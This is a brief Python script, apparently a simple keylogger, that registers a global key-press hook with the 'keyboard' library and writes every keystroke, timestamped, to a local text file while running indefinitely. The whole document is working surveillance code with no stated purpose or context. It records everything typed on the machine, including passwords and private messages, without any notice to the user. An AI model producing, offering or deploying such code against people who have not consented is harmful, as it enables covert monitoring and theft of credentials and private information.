import keyboard
import datetime

def log_key(e):
    with open("key_log.txt", "a") as f:
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"{current_time} - {e.name}\n")

# Listen for any key press
keyboard.on_press(log_key)

# Keep the script running
keyboard.wait()
